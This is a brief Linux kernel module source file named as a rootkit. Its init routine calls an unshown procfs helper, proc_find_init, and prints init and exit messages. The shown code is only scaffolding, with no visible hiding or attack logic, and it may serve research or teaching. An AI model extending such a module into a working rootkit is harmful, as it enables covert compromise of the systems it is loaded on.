#include <linux/init.h>
#include <linux/module.h>
#include "procfs_utils.h"


MODULE_LICENSE("GPL");


static int __init rootkit_init(void)
{
    proc_find_init();

    printk(KERN_ALERT "rootkit init\n");
    return 0;
}


static void __exit rootkit_exit(void)
{
    printk(KERN_ALERT "rookit exit\n");
}


module_init(rootkit_init);
module_exit(rootkit_exit);
